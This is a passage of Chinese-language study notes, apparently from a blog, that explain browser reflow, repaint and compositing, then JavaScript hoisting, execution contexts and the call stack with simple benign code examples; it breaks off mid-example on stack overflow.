title="相关概念"></a>相关概念</h3><p>有了上面介绍渲染流水线的基础，我们再来看看三个和渲染流水线相关的概念——<strong>“重排”“重绘”和“合成”</strong>。理解了这三个概念对于你后续 Web 的性能优化会有很大帮助。</p><h4 id="1-更新了元素的几何属性（重排）"><a href="#1-更新了元素的几何属性（重排）" class="headerlink" title="1. 更新了元素的几何属性（重排）"></a>1. 更新了元素的几何属性（重排）</h4><p>你可先参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173648455.png" alt="image-20221013173648455"></p><p>从上图可以看出，如果你通过 JavaScript 或者 CSS 修改元素的几何位置属性，例如改变元素的宽度、高度等，那么浏览器会触发重新布局，解析之后的一系列子阶段，这个过程就叫<strong>重排</strong>。无疑，<strong>重排需要更新完整的渲染流水线，所以开销也是最大的</strong>。</p><h4 id="2-更新元素的绘制属性（重绘）"><a href="#2-更新元素的绘制属性（重绘）" class="headerlink" title="2. 更新元素的绘制属性（重绘）"></a>2. 更新元素的绘制属性（重绘）</h4><p>接下来，我们再来看看重绘，比如通过 JavaScript 更改某些元素的背景颜色，渲染流水线会怎样调整呢？你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173658136.png" alt="image-20221013173658136"></p><p>从图中可以看出，如果修改了元素的背景颜色，那么布局阶段将不会被执行，因为并没有引起几何位置的变换，所以就直接进入了绘制阶段，然后执行之后的一系列子阶段，这个过程就叫<strong>重绘</strong>。相较于重排操作，<strong>重绘省去了布局和分层阶段，所以执行效率会比重排操作要高一些</strong>。</p><h4 id="3-直接合成阶段"><a href="#3-直接合成阶段" class="headerlink" title="3. 直接合成阶段"></a>3. 直接合成阶段</h4><p>那如果你更改一个既不要布局也不要绘制的属性，会发生什么变化呢？渲染引擎将跳过布局和绘制，只执行后续的合成操作，我们把这个过程叫做<strong>合成</strong>。具体流程参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173708467.png" alt="image-20221013173708467"></p><p>上图中，我们使用了 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以<strong>相对于重绘和重排，合成能大大提升绘制效率</strong>。</p><p>至于如何用这些概念去优化页面，我们会在后面相关章节做详细讲解的，这里你只需要先结合“渲染流水线”弄明白这三个概念及原理就行。</p><h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p>通过本文的分析，你应该可以看到，Chrome 的渲染流水线还是相当复杂晦涩，且难以理解，不过 Chrome 团队在不断添加新功能的同时，也在不断地重构一些子阶段，目的就是<strong>让整体渲染架构变得更加简单和高效</strong>，正所谓大道至简。</p><p>通过这么多年的生活和工作经验来看，无论是做架构设计、产品设计，还是具体到代码的实现，甚至处理生活中的一些事情，能够把复杂问题简单化的人都是具有大智慧的。所以，在工作或生活中，你若想要简化遇到的问题，就要刻意地练习，练就抓住问题本质的能力，把那些复杂的问题简单化，从而最终真正解决问题。</p><h1 id="二、浏览器中的-JavaScript-执行机制"><a href="#二、浏览器中的-JavaScript-执行机制" class="headerlink" title="二、浏览器中的 JavaScript 执行机制"></a>二、浏览器中的 JavaScript 执行机制</h1><p>讲解完宏观视角下的浏览器后，从这篇文章开始，我们就进入下一个新的模块了，这里我会对 JavaScript 执行原理做深入介绍。</p><p>今天在该模块的第一篇文章，我们主要讲解<strong>执行上下文</strong>相关的内容。那为什么先讲执行上下文呢？它这么重要吗？可以这么说，<strong>只有理解了 JavaScrip 的执行上下文，你才能更好地理解 JavaScript 语言本身</strong>，比如变量提升、作用域和闭包等。不仅如此，理解执行上下文和调用栈的概念还能助你成为一名更合格的前端开发者。</p><p>不过由于我们专栏不是专门讲 JavaScript 语言的，所以我并不会对 JavaScript 语法本身做过多介绍。本文主要是从 JavaScript 的顺序执行讲起，然后<strong>一步步带你了解 JavaScript 是怎么运行的</strong>。</p><h2 id="1-变量提升：JavaScript-代码是按顺序执行的吗？"><a href="#1-变量提升：JavaScript-代码是按顺序执行的吗？" class="headerlink" title="1. 变量提升：JavaScript 代码是按顺序执行的吗？"></a>1. 变量提升：JavaScript 代码是按顺序执行的吗？</h2><p>接下来咱们先看段代码，你觉得下面这段代码输出的结果是什么？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">showName()</span><br><span class="line">console.log(myname)</span><br><span class="line">var myname = &#x27;极客时间&#x27;</span><br><span class="line">function showName() &#123;</span><br><span class="line">    console.log(&#x27;函数 showName 被执行&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用过 JavaScript 开发的程序员应该都知道，JavaScript 是按顺序执行的。若按照这个逻辑来理解的话，那么：</p><ul><li>当执行到第 1 行的时候，由于函数 showName 还没有定义，所以执行应该会报错；</li><li>同样执行第 2 行的时候，由于变量 myname 函数也未定义，所以同样也会报错。</li></ul><p>然而实际执行结果却并非如此， 如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013193039206.png" alt="image-20221013193039206"></p><p>第 1 行输出“函数 showName 被执行”，第 2 行输出“undefined”，这和前面想象中的顺序执行有点不一样啊！</p><p>通过上面的执行结果，你应该已经知道了函数或者变量可以在定义之前使用，那如果使用没有定义的变量或者函数，JavaScript 代码还能继续执行吗？为了验证这点，我们可以删除第 3 行变量 myname 的定义，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">showName()</span><br><span class="line">console.log(myname)</span><br><span class="line">function showName() &#123;</span><br><span class="line">    console.log(&#x27;函数 showName 被执行&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再次执行这段代码时，JavaScript 引擎就会报错，结果如下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013193121813.png" alt="image-20221013193121813"></p><p>从上面两段代码的执行结果来看，我们可以得出如下三个结论。</p><ol><li>在执行过程中，若使用了未声明的变量，那么 JavaScript 执行会报错。</li><li>在一个变量定义之前使用它，不会出错，但是该变量的值会为 undefined，而不是定义时的值。</li><li>在一个函数定义之前使用它，不会出错，且函数能正确执行。</li></ol><p>第一个结论很好理解，因为变量没有定义，这样在执行 JavaScript 代码时，就找不到该变量，所以 JavaScript 会抛出错误。</p><p>但是对于第二个和第三个结论，就挺让人费解的：</p><ul><li>变量和函数为什么能在其定义之前使用？这似乎表明 JavaScript 代码并不是一行一行执行的。</li><li>同样的方式，变量和函数的处理结果为什么不一样？比如上面的执行结果，提前使用的 showName 函数能打印出来完整结果，但是提前使用的 myname 变量值却是 undefined，而不是定义时使用的“极客时间”这个值。</li></ul><h3 id="变量提升（Hoisting）"><a href="#变量提升（Hoisting）" class="headerlink" title="变量提升（Hoisting）"></a>变量提升（Hoisting）</h3><p>要解释这两个问题，你就需要先了解下什么是变量提升。</p><p>不过在介绍变量提升之前，我们先通过下面这段代码，来看看什么是 JavaScript 中的<strong>声明</strong>和<strong>赋值</strong>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myname = &#x27;极客时间&#x27;</span><br></pre></td></tr></table></figure><p>这段代码你可以把它看成是两行代码组成的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myname    // 声明部分</span><br><span class="line">myname = &#x27;极客时间&#x27;  // 赋值部分</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013193259240.png" alt="image-20221013193259240"></p><p>上面是<strong>变量</strong>的声明和赋值，那接下来我们再来看看<strong>函数</strong>的声明和赋值，结合下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">  console.log(&#x27;foo&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var bar = function()&#123;</span><br><span class="line">  console.log(&#x27;bar&#x27;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个函数 foo 是一个完整的函数声明，也就是说没有涉及到赋值操作；第二个函数是先声明变量 bar，再把<code>function()&#123;console.log(&#39;bar&#39;)&#125;</code>赋值给 bar。为了直观理解，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013193402762.png" alt="image-20221013193402762"></p><p>好了，理解了声明和赋值操作，那接下来我们就可以聊聊什么是变量提升了。</p><p><strong>所谓的变量提升，是指在 JavaScript 代码执行过程中，JavaScript 引擎把变量的声明部分和函数的声明部分提升到代码开头的“行为”。变量被提升后，会给变量设置默认值，这个默认值就是我们熟悉的 undefined。</strong></p><p>下面我们来模拟下实现：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">* 变量提升部分</span><br><span class="line">*/</span><br><span class="line">// 把变量 myname 提升到开头，</span><br><span class="line">// 同时给 myname 赋值为 undefined</span><br><span class="line">var myname = undefined</span><br><span class="line">// 把函数 showName 提升到开头</span><br><span class="line">function showName() &#123;</span><br><span class="line">    console.log(&#x27;showName 被调用&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* 可执行代码部分</span><br><span class="line">*/</span><br><span class="line">showName()</span><br><span class="line">console.log(myname)</span><br><span class="line">// 去掉 var 声明部分，保留赋值语句</span><br><span class="line">myname = &#x27;极客时间&#x27;</span><br></pre></td></tr></table></figure><p>为了模拟变量提升的效果，我们对代码做了以下调整，如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013193441366.png" alt="image-20221013193441366"></p><p>从图中可以看出，对原来的代码主要做了两处调整：</p><ul><li>第一处是把声明的部分都提升到了代码开头，如变量 myname 和函数 showName，并给变量设置默认值 undefined；</li><li>第二处是移除原本声明的变量和函数，如<code>var myname = &#39;极客时间&#39;</code>的语句，移除了 var 声明，整个移除 showName 的函数声明。</li></ul><p>通过这两步，就可以实现变量提升的效果。你也可以执行这段模拟变量提升的代码，其输出结果和第一段代码应该是完全一样的。</p><p>通过这段模拟的变量提升代码，相信你已经明白了可以在定义之前使用变量或者函数的原因——<strong>函数和变量在执行之前都提升到了代码开头</strong>。</p><h3 id="JavaScript-代码的执行流程"><a href="#JavaScript-代码的执行流程" class="headerlink" title="JavaScript 代码的执行流程"></a>JavaScript 代码的执行流程</h3><p>从概念的字面意义上来看，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面，正如我们所模拟的那样。但，这并不准确。<strong>实际上变量和函数声明在代码里的位置是不会改变的，而且是在编译阶段被 JavaScript 引擎放入内存中</strong>。对，你没听错，一段 JavaScript 代码在执行之前需要被 JavaScript 引擎编译，<strong>编译</strong>完成之后，才会进入<strong>执行</strong>阶段。大致流程你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013193523467.png" alt="image-20221013193523467"></p><h4 id="1-编译阶段"><a href="#1-编译阶段" class="headerlink" title="1. 编译阶段"></a>1. 编译阶段</h4><p>那么编译阶段和变量提升存在什么关系呢？</p><p>为了搞清楚这个问题，我们还是回过头来看上面那段模拟变量提升的代码，为了方便介绍，可以把这段代码分成两部分。</p><p><strong>第一部分：变量提升部分的代码。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myname = undefined</span><br><span class="line">function showName() &#123;</span><br><span class="line">    console.log(&#x27;函数 showName 被执行&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第二部分：执行部分的代码。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">showName()</span><br><span class="line">console.log(myname)</span><br><span class="line">myname = &#x27;极客时间&#x27;</span><br></pre></td></tr></table></figure><p>下面我们就可以把 JavaScript 的执行流程细化，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013204851093.png" alt="image-20221013204851093"></p><p>从上图可以看出，输入一段代码，经过编译后，会生成两部分内容：<strong>执行上下文（Execution context）**和**可执行代码</strong>。</p><p><strong>执行上下文是 JavaScript 执行一段代码时的运行环境</strong>，比如调用一个函数，就会进入这个函数的执行上下文，确定该函数在执行期间用到的诸如 this、变量、对象以及函数等。</p><p>关于执行上下文的细节，我会在下一篇文章《08 | 调用栈：为什么 JavaScript 代码会出现栈溢出？》做详细介绍，现在你只需要知道，在执行上下文中存在一个<strong>变量环境的对象</strong>（Viriable Environment），该对象中保存了变量提升的内容，比如上面代码中的变量 myname 和函数 showName，都保存在该对象中。</p><p>你可以简单地把变量环境对象看成是如下结构：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VariableEnvironment:</span><br><span class="line">     myname -&gt; undefined,</span><br><span class="line">     showName -&gt;function : &#123;console.log(myname)</span><br></pre></td></tr></table></figure><p>了解完变量环境对象的结构后，接下来，我们再结合下面这段代码来分析下是如何生成变量环境对象的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">showName()</span><br><span class="line">console.log(myname)</span><br><span class="line">var myname = &#x27;极客时间&#x27;</span><br><span class="line">function showName() &#123;</span><br><span class="line">    console.log(&#x27;函数 showName 被执行&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以一行一行来分析上述代码：</p><p>我们可以一行一行来分析上述代码：</p><ul><li>第 1 行和第 2 行，由于这两行代码不是声明操作，所以 JavaScript 引擎不会做任何处理；</li><li>第 3 行，由于这行是经过 var 声明的，因此 JavaScript 引擎将在环境对象中创建一个名为 myname 的属性，并使用 undefined 对其初始化；</li><li>第 4 行，JavaScript 引擎发现了一个通过 function 定义的函数，所以它将函数定义存储到堆 (HEAP）中，并在环境对象中创建一个 showName 的属性，然后将该属性值指向堆中函数的位置（不了解堆也没关系，JavaScript 的执行堆和执行栈我会在后续文章中介绍）。</li></ul><p>这样就生成了变量环境对象。接下来 JavaScript 引擎会把声明以外的代码编译为字节码，至于字节码的细节，我也会在后面文章中做详细介绍，你可以类比如下的模拟代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">showName()</span><br><span class="line">console.log(myname)</span><br><span class="line">myname = &#x27;极客时间&#x27;</span><br></pre></td></tr></table></figure><p>好了，现在有了执行上下文和可执行代码了，那么接下来就到了执行阶段了。</p><h4 id="2-执行阶段"><a href="#2-执行阶段" class="headerlink" title="2. 执行阶段"></a>2. 执行阶段</h4><p>JavaScript 引擎开始执行“可执行代码”，按照顺序一行一行地执行。下面我们就来一行一行分析下这个执行过程：</p><ul><li>当执行到 showName 函数时，JavaScript 引擎便开始在变量环境对象中查找该函数，由于变量环境对象中存在该函数的引用，所以 JavaScript 引擎便开始执行该函数，并输出“函数 showName 被执行”结果。</li><li>接下来打印“myname”信息，JavaScript 引擎继续在变量环境对象中查找该对象，由于变量环境存在 myname 变量，并且其值为 undefined，所以这时候就输出 undefined。</li><li>接下来执行第 3 行，把“极客时间”赋给 myname 变量，赋值后变量环境中的 myname 属性值改变为“极客时间”，变量环境如下所示：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VariableEnvironment:</span><br><span class="line">     myname -&gt; &quot; 极客时间 &quot;,</span><br><span class="line">     showName -&gt;function : &#123;console.log(myname)</span><br></pre></td></tr></table></figure><p>好了，以上就是一段代码的编译和执行流程。实际上，编译阶段和执行阶段都是非常复杂的，包括了词法分析、语法解析、代码优化、代码生成等，这些内容我会在《14 | 编译器和解释器：V8 是如何执行一段 JavaScript 代码的？》那节详细介绍，在本篇文章中你只需要知道 JavaScript 代码经过编译生成了什么内容就可以了。</p><h4 id="代码中出现相同的变量或者函数怎么办？"><a href="#代码中出现相同的变量或者函数怎么办？" class="headerlink" title="代码中出现相同的变量或者函数怎么办？"></a>代码中出现相同的变量或者函数怎么办？</h4><p>现在你已经知道了，在执行一段 JavaScript 代码之前，会编译代码，并将代码中的函数和变量保存到执行上下文的变量环境中，那么如果代码中出现了重名的函数或者变量，JavaScript 引擎会如何处理？</p><p>我们先看下面这样一段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function showName() &#123;</span><br><span class="line">    console.log(&#x27;极客邦&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">showName();</span><br><span class="line">function showName() &#123;</span><br><span class="line">    console.log(&#x27;极客时间&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">showName();</span><br></pre></td></tr></table></figure><p>在上面代码中，我们先定义了一个 showName 的函数，该函数打印出来“极客邦”；然后调用 showName，并定义了一个 showName 函数，这个 showName 函数打印出来的是“极客时间”；最后接着继续调用 showName。那么你能分析出来这两次调用打印出来的值是什么吗？</p><p>我们来分析下其完整执行流程：</p><ul><li><strong>首先是编译阶段</strong>。遇到了第一个 showName 函数，会将该函数体存放到变量环境中。接下来是第二个 showName 函数，继续存放至变量环境中，但是变量环境中已经存在一个 showName 函数了，此时，<strong>第二个 showName 函数会将第一个 showName 函数覆盖掉</strong>。这样变量环境中就只存在第二个 showName 函数了。</li><li><strong>接下来是执行阶段</strong>。先执行第一个 showName 函数，但由于是从变量环境中查找 showName 函数，而变量环境中只保存了第二个 showName 函数，所以最终调用的是第二个函数，打印的内容是“极客时间”。第二次执行 showName 函数也是走同样的流程，所以输出的结果也是“极客时间”。</li></ul><p>综上所述，<strong>一段代码如果定义了两个相同名字的函数，那么最终生效的是最后一个函数</strong>。</p><h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就到这里，下面我来简单总结下今天的主要内容：</p><ul><li>JavaScript 代码执行过程中，需要先做<strong>变量提升</strong>，而之所以需要实现变量提升，是因为 JavaScript 代码在执行之前需要先<strong>编译</strong>。</li><li>在<strong>编译阶段</strong>，变量和函数会被存放到<strong>变量环境</strong>中，变量的默认值会被设置为 undefined；在代码<strong>执行阶段</strong>，JavaScript 引擎会从变量环境中去查找自定义的变量和函数。</li><li>如果在编译阶段，存在两个相同的函数，那么最终存放在变量环境中的是最后定义的那个，这是因为后定义的会覆盖掉之前定义的。</li></ul><p>以上就是今天所讲的主要内容，当然，学习这些内容并不是让你掌握一些 JavaScript 小技巧，其主要目的是让你清楚 JavaScript 的执行机制：<strong>先编译，再执行</strong>。</p><p>如果你了解了 JavaScript 执行流程，那么在编写代码时，你就能避开一些陷阱；在分析代码过程中，也能通过分析 JavaScript 的执行过程来定位问题。</p><h2 id="2-调用栈：为什么-JavaScript-代码会出现栈溢出？"><a href="#2-调用栈：为什么-JavaScript-代码会出现栈溢出？" class="headerlink" title="2. 调用栈：为什么 JavaScript 代码会出现栈溢出？"></a>2. 调用栈：为什么 JavaScript 代码会出现栈溢出？</h2><p>在上篇文章中，我们讲到了，当一段代码被执行时，JavaScript 引擎先会对其进行编译，并创建执行上下文。但是并没有明确说明到底什么样的代码才算符合规范。</p><p>那么接下来我们就来明确下，哪些情况下代码才算是“一段”代码，才会在执行之前就进行编译并创建执行上下文。一般说来，有这么三种情况：</p><ol><li>当 JavaScript 执行全局代码的时候，会编译全局代码并创建全局执行上下文，而且在整个页面的生存周期内，全局执行上下文只有一份。</li><li>当调用一个函数的时候，函数体内的代码会被编译，并创建函数执行上下文，一般情况下，函数执行结束之后，创建的函数执行上下文会被销毁。</li><li>当使用 eval 函数的时候，eval 的代码也会被编译，并创建执行上下文。</li></ol><p><strong>什么是执行上下文</strong><br>当 <code>JS</code> 引擎解析到可执行代码片段（通常是函数调用阶段）的时候，就会先做一些执行前的准备工作，这个 <strong>“准备工作”</strong>，就叫做 <strong>“执行上下文(execution context 简称 <code>EC</code>)”</strong> 或者也可以叫做<strong>执行环境</strong>。</p><blockquote><p><strong>执行上下文</strong> 为我们的可执行代码块提供了执行前的必要准备工作，例如变量对象的定义、作用域链的扩展、提供调用者的对象引用等信息。</p></blockquote><h3 id="执行上下文的类型"><a href="#执行上下文的类型" class="headerlink" title="执行上下文的类型"></a><strong>执行上下文的类型</strong></h3><p><code>javascript</code> 中有三种执行上下文类型，分别是：</p><ul><li><strong>全局执行上下文</strong>——这是默认或者说是最基础的执行上下文，一个程序中只会存在一个全局上下文，<br>它在整个 <code>javascript</code> 脚本的生命周期内都会存在于执行堆栈的最底部不会被栈弹出销毁。全局上下文会生成一个全局对象（以浏览器环境为例，这个全局对象是 <code>window</code>），并且将 <code>this</code> 值绑定到这个全局对象上。</li><li><strong>函数执行上下文</strong>——每当一个函数被调用时，都会创建一个新的函数执行上下文（不管这个函数是不是被重复调用的）</li><li><strong>Eval 函数执行上下文</strong>—— 执行在 <code>eval</code> 函数内部的代码也会有它属于自己的执行上下文，但由于并不经常使用 <code>eval</code>，所以在这里不做分析。</li></ul><p>好了，又进一步理解了执行上下文，那本节我们就在这基础之上继续深入，一起聊聊<strong>调用栈</strong>。学习调用栈至少有以下三点好处：</p><ol><li>可以帮助你了解 JavaScript 引擎背后的工作原理；</li><li>让你有调试 JavaScript 代码的能力；</li><li>帮助你搞定面试，因为面试过程中，调用栈也是出境率非常高的题目。</li></ol><p>比如你在写 JavaScript 代码的时候，有时候可能会遇到栈溢出的错误，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013214822865.png" alt="image-20221013214822865"></p><p>那为什么会出现这种错误呢？这就涉及到了<strong>调用栈</strong>的内容。你应该知道 JavaScript 中有很多函数，经常会出现在一个函数中调用另外一个函数的情况，<strong>调用栈就是用来管理函数调用关系的一种数据结构</strong>。因此要讲清楚调用栈，你还要先弄明白<strong>函数调用</strong>和<strong>栈结构</strong>。</p><h3 id="什么是函数调用"><a href="#什么是函数调用" class="headerlink" title="什么是函数调用"></a>什么是函数调用</h3><p>函数调用就是运行一个函数，具体使用方式是使用函数名称跟着一对小括号。下面我们看个简单的示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = 2</span><br><span class="line">function add()&#123;</span><br><span class="line">var b = 10</span><br><span class="line">return  a+b</span><br><span class="line">&#125;</span><br><span class="line">add()</span><br></pre></td></tr></table></figure><p>这段代码很简单，先是创建了一个 add 函数，接着在代码的最下面又调用了该函数。</p><p>那么下面我们就利用这段简单的代码来解释下函数调用的过程。</p><p>在执行到函数 add() 之前，JavaScript 引擎会为上面这段代码创建全局执行上下文，包含了声明的函数和变量，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013215121198.png" alt="image-20221013215121198"></p><p>从图中可以看出，代码中全局变量和函数都保存在全局上下文的变量环境中。</p><p>执行上下文准备好之后，便开始执行全局代码，当执行到 add 这儿时，JavaScript 判断这是一个函数调用，那么将执行以下操作：</p><ul><li>首先，从<strong>全局执行上下文</strong>中，取出 add 函数代码。</li><li>其次，对 add 函数的这段代码进行编译，并创建<strong>该函数的执行上下文</strong>和<strong>可执行代码</strong>。</li><li>最后，执行代码，输出结果。</li></ul><p>完整流程你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013215403137.png" alt="image-20221013215403137"></p><p>就这样，当执行到 add 函数的时候，我们就有了两个执行上下文了——全局执行上下文和 add 函数的执行上下文。</p><p>也就是说在执行 JavaScript 时，可能会存在多个执行上下文，那么 JavaScript 引擎是如何管理这些执行上下文的呢？</p><p>答案是<strong>通过一种叫栈的数据结构来管理的</strong>。那什么是栈呢？它又是如何管理这些执行上下文呢？</p><h3 id="什么是栈"><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h3><p>关于栈，你可以结合这么一个贴切的例子来理解，一条单车道的单行线，一端被堵住了，而另一端入口处没有任何提示信息，堵住之后就只能后进去的车子先出来，这时这个堵住的单行线就可以被看作是一个<strong>栈容器</strong>，车子开进单行线的操作叫做<strong>入栈</strong>，车子倒出去的操作叫做<strong>出栈</strong>。</p><p>在车流量较大的场景中，就会发生反复的入栈、栈满、出栈、空栈和再次入栈，一直循环。</p><p>所以，栈就是类似于一端被堵住的单行线，车子类似于栈中的元素，栈中的元素满足<strong>后进先出</strong>的特点。你可以参看下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013215718227.png" alt="image-20221013215718227"></p><h3 id="什么是-JavaScript-的调用栈"><a href="#什么是-JavaScript-的调用栈" class="headerlink" title="什么是 JavaScript 的调用栈"></a>什么是 JavaScript 的调用栈</h3><p>JavaScript 引擎正是利用栈的这种结构来管理执行上下文的。在执行上下文创建好后，JavaScript 引擎会将执行上下文压入栈中，通常把这种用来管理执行上下文的栈称为<strong>执行上下文栈</strong>，又称<strong>调用栈</strong>。</p><p>为便于你更好地理解调用栈，下面我们再来看段稍微复杂点的示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = 2</span><br><span class="line">function add(b,c)&#123;</span><br><span class="line">  return b+c</span><br><span class="line">&#125;</span><br><span class="line">function addAll(b,c)&#123;</span><br><span class="line">var d = 10</span><br><span class="line">result = add(b,c)</span><br><span class="line">return  a+result+d</span><br><span class="line">&#125;</span><br><span class="line">addAll(3,6)</span><br></pre></td></tr></table></figure><p>在上面这段代码中，你可以看到它是在 addAll 函数中调用了 add 函数，那在整个代码的执行过程中，调用栈是怎么变化的呢？</p><p>下面我们就一步步地分析在代码的执行过程中，调用栈的状态变化情况。</p><p><strong>第一步，创建全局上下文，并将其压入栈底</strong>。如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013220040148.png" alt="image-20221013220040148"></p><p>从图中你也可以看出，变量 a、函数 add 和 addAll 都保存到了全局上下文的变量环境对象中。</p><p>全局执行上下文压入到调用栈后，JavaScript 引擎便开始执行全局代码了。首先会执行 a&#x3D;2 的赋值操作，执行该语句会将全局上下文变量环境中 a 的值设置为 2。设置后的全局上下文的状态如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013220129185.png" alt="image-20221013220129185"></p><p>接下来，<strong>第二步是调用 addAll 函数</strong>。当调用该函数时，JavaScript 引擎会编译该函数，并为其创建一个执行上下文，最后还将该函数的执行上下文压入栈中，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013220653113.png" alt="image-20221013220653113"></p><p>addAll 函数的执行上下文创建好之后，便进入了函数代码的执行阶段了，这里先执行的是 d&#x3D;10 的赋值操作，执行语句会将 addAll 函数执行上下文中的 d 由 undefined 变成了 10。</p><p>然后接着往下执行，<strong>第三步，当执行到 add 函数</strong>调用语句时，同样会为其创建执行上下文，并将其压入调用栈，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013221652093.png" alt="image-20221013221652093"></p><p>当 add 函数返回时，该函数的执行上下文就会从栈顶弹出，并将 result 的值设置为 add 函数的返回值，也就是 9。如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013221752682.png" alt="image-20221013221752682"></p><p>紧接着 addAll 执行最后一个相加操作后并返回，addAll 的执行上下文也会从栈顶部弹出，此时调用栈中就只剩下全局上下文了。最终如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013221846843.png" alt="image-20221013221846843"></p><p>至此，整个 JavaScript 流程执行结束了。</p><p>好了，现在你应该知道了<strong>调用栈是 JavaScript 引擎追踪函数执行的一个机制</strong>，当一次有多个函数被调用时，通过调用栈就能够追踪到哪个函数正在被执行以及各函数之间的调用关系。</p><h3 id="在开发中，如何利用好调用栈"><a href="#在开发中，如何利用好调用栈" class="headerlink" title="在开发中，如何利用好调用栈"></a>在开发中，如何利用好调用栈</h3><p>鉴于调用栈的重要性和实用性，那么接下来我们就一起来看看在实际工作中，应该如何查看和利用好调用栈。</p><h4 id="1-如何利用浏览器查看调用栈的信息"><a href="#1-如何利用浏览器查看调用栈的信息" class="headerlink" title="1. 如何利用浏览器查看调用栈的信息"></a>1. 如何利用浏览器查看调用栈的信息</h4><p>当你执行一段复杂的代码时，你可能很难从代码文件中分析其调用关系，这时候你可以在你想要查看的函数中加入断点，然后当执行到该函数时，就可以查看该函数的调用栈了。</p><p>这么说可能有点抽象，这里我们拿上面的那段代码做个演示，你可以打开“开发者工具”，点击“Source”标签，选择 JavaScript 代码的页面，然后在第 3 行加上断点，并刷新页面。你可以看到执行到 add 函数时，执行流程就暂停了，这时可以通过右边“call stack”来查看当前的调用栈的情况，如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013222250581.png" alt="image-20221013222250581"></p><p>从图中可以看出，右边的“call stack”下面显示出来了函数的调用关系：栈的最底部是 anonymous，也就是全局的函数入口；中间是 addAll 函数；顶部是 add 函数。这就清晰地反映了函数的调用关系，所以<strong>在分析复杂结构代码，或者检查 Bug 时，调用栈都是非常有用的</strong>。</p><p>除了通过断点来查看调用栈，你还可以使用 console.trace() 来输出当前的函数调用关系，比如在示例代码中的 add 函数里面加上了 console.trace()，你就可以看到控制台输出的结果，如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013222342327.png" alt="image-20221013222342327"></p><h4 id="2-栈溢出（Stack-Overflow）"><a href="#2-栈溢出（Stack-Overflow）" class="headerlink" title="2. 栈溢出（Stack Overflow）"></a>2. 栈溢出（Stack Overflow）</h4><p>现在你知道了调用栈是一种用来管理执行上下文的数据结构，符合后进先出的规则。不过还有一点你要注意，<strong>调用栈是有大小的</strong>，当入栈的执行上下文超过一定数目，JavaScript 引擎就会报错，我们把这种错误叫做<strong>栈溢出</strong>。</p><p>特别是在你写递归代码的时候，就很容易出现栈溢出的情况。比如下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function division(a,b)&#123;</span><br><span class="line">    return 